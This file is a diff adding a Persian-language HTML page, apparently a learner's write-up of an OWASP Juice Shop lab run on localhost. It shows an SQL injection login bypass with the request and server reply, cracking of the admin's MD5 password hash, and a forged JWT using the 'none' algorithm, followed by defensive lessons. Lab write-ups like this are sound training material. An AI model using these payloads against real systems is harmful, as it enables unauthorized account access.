@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>گزارش دقیق مسیرهای طی‌شده - هک وب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0d1117;
+            color: #e6edf3;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1000px;
+            width: 100%;
+            background: #161b22;
+            padding: 40px 45px;
+            border-radius: 20px;
+            border: 1px solid #30363d;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
+        }
+
+        h1 {
+            font-size: 30px;
+            color: #f0883e;
+            border-right: 5px solid #f0883e;
+            padding-right: 15px;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            color: #8b949e;
+            font-size: 14px;
+            margin-bottom: 30px;
+            padding-right: 20px;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 15px;
+        }
+
+        .badge-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #21262d;
+            color: #58a6ff;
+            font-size: 13px;
+            padding: 5px 16px;
+            border-radius: 30px;
+            border: 1px solid #30363d;
+        }
+
+        .badge.green {
+            color: #3fb950;
+            border-color: #2ea043;
+        }
+        .badge.orange {
+            color: #f0883e;
+            border-color: #d29922;
+        }
+        .badge.purple {
+            color: #bc8cff;
+            border-color: #8957e5;
+        }
+
+        .section {
+            margin-top: 30px;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 25px;
+        }
+        .section:last-child {
+            border-bottom: none;
+        }
+
+        h2 {
+            font-size: 22px;
+            color: #f0e6d0;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        h2 .emoji {
+            font-size: 26px;
+        }
+
+        p, li {
+            line-height: 1.9;
+            color: #c9d1d9;
+            font-size: 15px;
+        }
+
+        ul {
+            padding-right: 25px;
+            margin-top: 8px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+
+        .code-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin: 12px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #f0883e;
+            direction: ltr;
+            text-align: left;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .code-box .comment {
+            color: #8b949e;
+        }
+        .code-box .highlight {
+            color: #58a6ff;
+        }
+
+        .success-box {
+            background: #0f2d1f;
+            border-right: 5px solid #2ea043;
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin: 18px 0;
+        }
+        .success-box strong {
+            color: #3fb950;
+        }
+
+        .warning-box {
+            background: #2d1f0f;
+            border-right: 5px solid #d29922;
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin: 18px 0;
+        }
+        .warning-box strong {
+            color: #e3b341;
+        }
+
+        .step {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            align-items: flex-start;
+        }
+        .step-num {
+            background: #21262d;
+            color: #58a6ff;
+            font-weight: bold;
+            min-width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+            border: 1px solid #30363d;
+            flex-shrink: 0;
+        }
+        .step-content {
+            flex: 1;
+        }
+        .step-content p {
+            margin: 0 0 6px 0;
+        }
+
+        .two-col {
+            display: flex;
+            gap: 20px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+        .two-col>div {
+            flex: 1;
+            min-width: 250px;
+            background: #0d1117;
+            padding: 14px 18px;
+            border-radius: 12px;
+            border: 1px solid #21262d;
+        }
+        .two-col .label {
+            font-size: 12px;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .two-col .value {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #f0883e;
+            word-break: break-all;
+            margin-top: 4px;
+        }
+
+        .footer {
+            margin-top: 35px;
+            padding-top: 20px;
+            border-top: 1px solid #21262d;
+            text-align: center;
+            font-size: 14px;
+            color: #8b949e;
+        }
+        .footer strong {
+            color: #f0883e;
+        }
+
+        @media (max-width: 550px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .two-col {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- هدر -->
+    <span class="badge">📅 تاریخ: ۲۷ مرداد ۱۴۰۵</span>
+    <span class="badge green" style="margin-right:10px;">✅ وضعیت: موفق</span>
+    <span class="badge purple" style="margin-right:10px;">📂 جزئیات: کامل</span>
+
+    <h1>📋 گزارش دقیق مسیرهای طی‌شده</h1>
+    <div class="subtitle">همه‌ی دستورات، آدرس‌ها، فایل‌ها و قدم‌های عملی از ابتدا تا انتها</div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۱: رفع مشکل VMware -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">🖥️</span> ۱. رفع مشکل VMware (خطای قفل دیسک)</h2>
+
+        <div class="step">
+            <div class="step-num">۱</div>
+            <div class="step-content">
+                <p><strong>مشکل:</strong> هنگام روشن کردن ماشین مجازی، خطای زیر ظاهر شد:</p>
+                <div class="code-box">
+The process cannot access the file because another process has locked a portion of the file
+Cannot open the disk 'D:\Kalilinux\Debian 10.x-1-000001.vmdk'
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۲</div>
+            <div class="step-content">
+                <p><strong>علت:</strong> فایل‌های قفل موقت (<code>.lck</code>) پس از بسته‌شدن ناگهانی VMware باقی مانده بودند.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۳</div>
+            <div class="step-content">
+                <p><strong>راه‌حل:</strong></p>
+                <ul>
+                    <li>رفتن به مسیر: <code>D:\Kalilinux\</code></li>
+                    <li>حذف فایل‌های <code>.lck</code>:</li>
+                </ul>
+                <div class="code-box">
+<span class="comment"># فایل‌های حذف‌شده</span>
+Debian 10.x-1-000001.vmdk.lck
+Debian 10.x-000001.vmdk.lck
+                </div>
+            </div>
+        </div>
+
+        <div class="success-box">
+            <strong>✅ نتیجه:</strong> ماشین مجازی بدون مشکل استارت خورد و محیط کالی در دسترس قرار گرفت.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۲: رفع مشکل شبکه و ریپازیتوری -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">🌐</span> ۲. رفع مشکل شبکه و ریپازیتوری کالی</h2>
+
+        <div class="step">
+            <div class="step-num">۱</div>
+            <div class="step-content">
+                <p><strong>مشکل:</strong> هنگام نصب ابزار <code>hashcat</code>، ارور <code>403 Forbidden</code> و <code>404 Not Found</code> از سرورهای کالی دریافت شد.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۲</div>
+            <div class="step-content">
+                <p><strong>علت:</strong> سرورهای پیش‌فرض کالی (<code>http.kali.org</code>) در دسترس نبودند.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۳</div>
+            <div class="step-content">
+                <p><strong>راه‌حل:</strong> تغییر فایل <code>/etc/apt/sources.list</code>:</p>
+                <div class="code-box">
+<span class="comment"># nano /etc/apt/sources.list</span>
+deb http://archive.kali.org/kali kali-rolling main non-free contrib
+deb-src http://archive.kali.org/kali kali-rolling main non-free contrib
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۴</div>
+            <div class="step-content">
+                <p><strong>دستورات اجرا شده:</strong></p>
+                <div class="code-box">
+sudo apt update
+sudo apt install hashcat -y
+                </div>
+            </div>
+        </div>
+
+        <div class="success-box">
+            <strong>✅ نتیجه:</strong> ریپازیتوری جدید با موفقیت شناسایی شد و <strong>hashcat</strong> نصب گردید.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۳: حمله‌ی SQL Injection -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">⚡</span> ۳. حمله‌ی SQL Injection و ورود به پنل ادمین</h2>
+
+        <div class="step">
+            <div class="step-num">۱</div>
+            <div class="step-content">
+                <p><strong>هدف:</strong> دورزدن فرم لاگین و ورود به حساب ادمین.</p>
+                <p><strong>آدرس فرم لاگین:</strong> <code>http://127.0.0.1:3000/#/login</code></p>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۲</div>
+            <div class="step-content">
+                <p><strong>درخواست ارسالی:</strong></p>
+                <div class="code-box">
+POST /rest/user/login HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/json
+
+{"email":"<span class="highlight">' OR 1=1;--</span>", "password":"abc"}
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۳</div>
+            <div class="step-content">
+                <p><strong>کوئری ساخته‌شده در پشت‌صحنه:</strong></p>
+                <div class="code-box">
+SELECT * FROM users WHERE email = '' OR 1=1;--' AND password = 'abc'
+                </div>
+                <p>بخش <code>' OR 1=1</code> شرط را همیشه <code>TRUE</code> می‌کند و <code>--</code> بقیه‌ی کوئری را به توضیح (Comment) تبدیل می‌کند.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۴</div>
+            <div class="step-content">
+                <p><strong>پاسخ سرور:</strong></p>
+                <div class="code-box">
+HTTP/1.1 200 OK
+{
+  "authentication": {
+    "token": "eyJhbGciOiJSUzI1NiIs...",
+    "bid": 1
+  }
+}
+                </div>
+            </div>
+        </div>
+
+        <div class="success-box">
+            <strong>✅ نتیجه:</strong> چالش <strong>Login Admin</strong> با موفقیت حل شد و توکن ادمین دریافت گردید.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۴: استخراج اطلاعات ادمین -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">📂</span> ۴. استخراج اطلاعات کاربر ادمین از دیتابیس</h2>
+
+        <div class="step">
+            <div class="step-num">۱</div>
+            <div class="step-content">
+                <p><strong>اطلاعات استخراج‌شده:</strong></p>
+                <div class="two-col">
+                    <div>
+                        <div class="label">👤 مشخصات کاربر</div>
+                        <div class="value" style="direction:ltr;text-align:left;font-size:12px;">
+                            id: 1<br />
+                            email: admin@juice-sh.op<br />
+                            role: admin<br />
+                            isActive: true<br />
+                            bid: 1
+                        </div>
+                    </div>
+                    <div>
+                        <div class="label">🔑 هش رمز عبور</div>
+                        <div class="value" style="direction:ltr;text-align:left;font-size:12px;color:#3fb950;">
+                            0192023a7bbd73250516f069df18b500
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <strong>📌 نکته:</strong> هش رمز عبور از نوع <strong>MD5</strong> است و با ابزار <strong>hashcat</strong> یا سایت‌های کرک آنلاین قابل شکستن می‌باشد.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۵: کرک هش با CrackStation -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">🔓</span> ۵. کرک هش رمز عبور با CrackStation</h2>
+
+        <div class="step">
+            <div class="step-num">۱</div>
+            <div class="step-content">
+                <p><strong>روش:</strong></p>
+                <ul>
+                    <li>رفتن به سایت: <code>https://crackstation.net</code></li>
+                    <li>چسباندن هش <code>0192023a7bbd73250516f069df18b500</code> در قسمت ورودی</li>
+                    <li>کلیک روی دکمه‌ی <strong>"Crack Hashes"</strong></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۲</div>
+            <div class="step-content">
+                <p><strong>نتیجه:</strong></p>
+                <div class="code-box" style="color:#3fb950;">
+رمز عبور پیدا شده: admin123
+                </div>
+            </div>
+        </div>
+
+        <div class="success-box">
+            <strong>✅ نتیجه:</strong> رمز عبور واقعی ادمین (<code>admin123</code>) با موفقیت بازیابی شد.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۶: دستکاری JWT در Repeater -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">🔄</span> ۶. دستکاری JWT در Repeater</h2>
+
+        <div class="step">
+            <div class="step-num">۱</div>
+            <div class="step-content">
+                <p><strong>مراحل:</strong></p>
+                <ul>
+                    <li>درخواست <code>GET /rest/user/me</code> را در <strong>Proxy → HTTP History</strong> پیدا کردم.</li>
+                    <li>روی آن راست‌کلیک کرده و <strong>"Send to Repeater"</strong> را انتخاب کردم.</li>
+                    <li>هدر <code>Authorization: Bearer &lt;token&gt;</code> را در Repeater مشاهده کردم.</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۲</div>
+            <div class="step-content">
+                <p><strong>تغییرات اعمال‌شده روی توکن:</strong></p>
+                <ul>
+                    <li>توکن در Repeater انتخاب و به <strong>JSON Web Token</strong> tab منتقل شد.</li>
+                    <li>در بخش <strong>Payload</strong>، مقدار <code>"email": "admin@juice-sh.op"</code> به <code>"email": "customer@juice-sh.op"</code> تغییر یافت.</li>
+                    <li>برای امضای مجدد، الگوریتم به <code>none</code> تغییر داده شد (برای دورزدن امضا).</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۳</div>
+            <div class="step-content">
+                <p><strong>توکن نهایی ساخته‌شده:</strong></p>
+                <div class="code-box">
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiY3VzdG9tZXJAanVpY2Utc2hvcC5vcCIsImlkIjoxLCJyb2xlIjoiYWRtaW4ifSwiaWF0IjoxNzI0NTk0MDg1LCJleHAiOjE3MjQ1OTc2ODV9.
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-num">۴</div>
+            <div class="step-content">
+                <p><strong>ارسال درخواست:</strong></p>
+                <ul>
+                    <li>توکن جدید در هدر <code>Authorization</code> قرار داده شد.</li>
+                    <li>دکمه‌ی <strong>Send</strong> در Repeater کلیک شد.</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <strong>📌 نکته:</strong> سرور ممکن است الگوریتم <code>none</code> را قبول نکند. در این صورت باید از کلید <code>secret</code> برای امضای مجدد با الگوریتم <code>HS256</code> استفاده شود.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- بخش ۷: جمع‌بندی نهایی -->
+    <!-- ============================================ -->
+    <div class="section">
+        <h2><span class="emoji">🏁</span> ۷. جمع‌بندی نهایی</h2>
+        <ul>
+            <li><strong>🖥️ VMware:</strong> خطای قفل دیسک با حذف فایل‌های <code>.lck</code> از مسیر <code>D:\Kalilinux\</code> برطرف شد.</li>
+            <li><strong>🌐 شبکه:</strong> ریپازیتوری کالی از <code>http.kali.org</code> به <code>archive.kali.org</code> تغییر یافت و <code>hashcat</code> نصب شد.</li>
+            <li><strong>⚡ SQL Injection:</strong> با تزریق <code>' OR 1=1;--</code> در فرم لاگین، احراز هویت دور زده شد و توکن ادمین دریافت گردید.</li>
+            <li><strong>📂 استخراج اطلاعات:</strong> هش رمز عبور ادمین (<code>0192023a7bbd73250516f069df18b500</code>) از دیتابیس استخراج شد.</li>
+            <li><strong>🔓 کرک هش:</strong> با استفاده از سایت <code>crackstation.net</code>، رمز عبور <code>admin123</code> بازیابی شد.</li>
+            <li><strong>🔄 دستکاری JWT:</strong> توکن ادمین در Repeater تغییر داده شد تا ایمیل به <code>customer@juice-sh.op</code> تبدیل گردد.</li>
+        </ul>
+
+        <div class="success-box">
+            <strong>🎯 درس آموخته:</strong> 
+            ترکیب آسیب‌پذیری‌های ساده مانند SQL Injection و ضعف در مدیریت توکن‌های JWT می‌تواند امنیت کل سیستم را به خطر بیندازد. 
+            همواره ورودی‌ها را پالایش کرده، از کوئری‌های پارامتری استفاده کنید و الگوریتم‌های امضای قوی (مانند RS256 با کلید خصوصی امن) را برای توکن‌ها به کار بگیرید.
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- فوتر -->
+    <!-- ============================================ -->
+    <div class="footer">
+        تهیه‌شده توسط <strong>مریم</strong> — در مسیر یادگیری هک و امنیت وب 💻🔥
+        <br />
+        <span style="font-size:13px; color:#6e7681;">
+            ابزارهای استفاده‌شده: VMware, Kali Linux, Burp Suite, OWASP Juice Shop, CrackStation
+        </span>
+    </div>
+
+</div>
+
+</body>
+</html>
